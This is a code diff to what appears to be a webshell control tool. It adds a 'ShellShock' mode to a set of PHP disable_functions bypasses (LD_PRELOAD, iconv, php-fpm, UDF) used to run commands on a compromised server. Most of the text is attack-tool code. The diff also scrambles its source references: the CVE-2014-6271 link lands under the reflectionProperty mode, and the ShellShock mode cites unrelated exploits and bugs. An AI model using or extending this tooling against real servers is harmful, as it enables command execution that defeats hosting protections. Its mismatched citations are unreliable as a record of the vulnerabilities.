@@ -1,6 +1,5 @@
 from os import path
 from uuid import uuid4
-from random import choice
 
 from libs.app import readline
 from libs.config import alias, color, gget, gset
@@ -22,9 +21,10 @@ mode_to_desc_dict = {-1: color.red("closed"),
                      12: color.green("iconv"),
                      13: color.green("FFI-php_exec"),
                      14: color.green("php7-reflectionProperty"),
-                     15: color.green("php-user_filter")
+                     15: color.green("php-user_filter"),
+                     16: color.green("ShellShock")
                      }
-mode_linux_set = {1, 2, 3, 4, 5, 9, 12, 13, 14, 15}
+mode_linux_set = {1, 2, 3, 4, 5, 9, 12, 13, 14, 15, 16}
 mode_windows_set = {6, }
 mode_require_ext_dict = {5: "FFI", 6: "com_dotnet",
                          7: "imap", 12: "iconv", 13: "FFI"}
@@ -65,13 +65,13 @@ def set_mode(mode: int, test: bool = False):
             filename = "/tmp/%s.so" % str(uuid4())
             # get ld_preload trigger function
             available_trigger_funcs = [
-                'mail', 'error_log', 'mb_send_mail', 'imap_mail']
-            ld_preload_funcs = [
+                'mail', 'error_log', 'mb_send_mail']
+            trigger_funcs = [
                 f for f in available_trigger_funcs if f not in disable_funcs]
-            if (not ld_preload_funcs):
-                print(color.red("\nNo ld_preload function\n"))
+            if (not trigger_funcs):
+                print(color.red("\nNo trigger function\n"))
                 return False
-            ld_preload_func = choice(ld_preload_funcs)
+            trigger_func = trigger_funcs[0]
 
             # get target architecture
             bits = gget("webshell.arch", namespace="webshell")
@@ -96,7 +96,7 @@ def set_mode(mode: int, test: bool = False):
                 return
 
             gset("webshell.ld_preload_path", filename, True, "webshell")
-            gset("webshell.ld_preload_func", ld_preload_func, True, "webshell")
+            gset("webshell.ld_preload_func", trigger_func, True, "webshell")
 
     elif (mode == 8):  # udf
         if (gget("db_connected", "webshell") and gget("db_dbms", "webshell") == "mysql"):
@@ -166,9 +166,10 @@ def set_mode(mode: int, test: bool = False):
             return False
     elif (mode == 10):  # php-fpm
         res = send("print(php_sapi_name());")
-        if (not res or "fpm" not in res.r_text):
-            print(color.red("\nTarget php not run by php-fpm\n"))
+        if (not res):
+            print(color.red("\nNo response\n"))
             return False
+        print(color.yellow("php_sapi_name: " + res.r_text))
         requirements_dict = {'host': '127.0.0.1', 'port': 9000}
         attack_type = input(
             "attack_type[gopher(need curl extension)/sock/http_sock/ftp]:").lower()
@@ -222,7 +223,7 @@ print("success");""")
         if (res.r_text != "success"):
             print(color.red(f"\n{res.r_text}\n"))
             return False
-    elif (mode == 12 and not gget("webshell.ld_preload_path", "webshell", False)):  # iconv
+    elif (mode == 12):  # iconv
 
         disable_funcs = gget("webshell.disable_functions", "webshell")
 
@@ -265,6 +266,28 @@ module  INTERNAL    PAYLOAD//    ../../../../../../../..{filename}    2"""
             gset("webshell.iconv_path", filename+".so", True, "webshell")
             gset("webshell.iconv_gconv_modules_path",
                  "/tmp/gconv-modules", True, "webshell")
+    elif (mode == 16 and not gget("webshell.shellshock_func", "webshell", False)):  # ShellShock
+        if is_windows():
+            print(color.red("\nNo ld_preload function!\n"))
+            return False
+
+        disable_funcs = gget("webshell.disable_functions", "webshell")
+
+        if ("putenv" in disable_funcs):
+            print(color.red("\nputenv is disabled\n"))
+            return False
+
+        available_trigger_funcs = [
+            'mail', 'error_log', 'mb_send_mail']
+        trigger_funcs = [
+            f for f in available_trigger_funcs if f not in disable_funcs]
+        if (not trigger_funcs):
+            print(color.red("\nNo trigger function\n"))
+            return False
+        trigger_func = trigger_funcs[0]
+
+        gset("webshell.shellshock_func", trigger_func, True, "webshell")
+
     if (not test):
         if (mode in (7, 10, 12)):
             print(color.yellow(
@@ -410,7 +433,7 @@ def run(mode: str = '0'):
     Mode 14 php7-reflectionProperty:
 
         Origin:
-        - https://bugs.php.net/bug.php?id=79820
+        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
         - https://github.com/AntSword-Store/as_bypass_php_disable_functions/blob/2508035ff50884013f0cbb313f513408360a2589/payload.js
 
         Targets:
@@ -427,6 +450,16 @@ def run(mode: str = '0'):
 
         Targets:
         - 7.0 - 8.0
+
+    Mode 16 ShellShock(CVE-2014-6271)
+
+        Origin:
+        - https://github.com/mm0r1/exploits/blob/master/php-filter-bypass
+        - https://bugs.php.net/bug.php?id=54350
+
+        Targets:
+        - 5.* >= 5.4.0
+        - Bash <= 4.3
     """
     if (mode == "close"):
         mode = -1
